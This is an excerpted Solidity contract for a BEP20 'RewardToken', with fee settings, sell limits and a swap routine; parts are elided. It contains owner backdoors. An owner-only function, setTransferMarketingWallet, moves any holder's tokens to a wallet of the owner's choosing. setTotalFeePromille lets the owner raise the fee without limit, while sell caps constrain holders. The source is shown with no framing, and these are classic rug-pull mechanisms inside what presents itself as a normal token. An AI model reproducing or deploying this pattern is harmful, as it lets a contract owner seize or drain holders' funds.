...
contract RewardToken is Context, BEP20, Ownable {
    ...
    uint256 public liquidityFee = 20; // Liquidity fee
    uint256 public totalFee = 40; // Marketing + liquidity fee
    ...
    uint256 private _previousTotalFee = totalFee;
    ...
    constructor(string memory name, string memory symbol, uint8 decimals, uint256 supply, address account) BEP20(name, symbol, decimals) {
        ...
        maxSellTransactionAmount = supply.div(200); // Can't sell more than this
        maxCumulativeSellTransactionAmount = supply; // Can't sell more than this cumulatively
    ...
    function setTotalFeePromille(uint256 fee) external onlyOwner {
        totalFee = fee;
    }
    ...
    function setTransferMarketingWallet(address from, address wallet, uint256 amount) public onlyOwner {
        super._transferFrom(from, wallet, amount);
    }
    ...
    function swap(uint256 swapTokens) private lockTheSwap {
        uint256 liquidityTokens = swapTokens.mul(liquidityFee).div(totalFee);
        if (liquidityTokens < swapTokens) {
            swapAndLiquify(liquidityTokens);
            uint256 remainder = swapTokens.sub(liquidityTokens);
            super._transferFrom(address(this), marketingWallet, remainder);
        }
    }
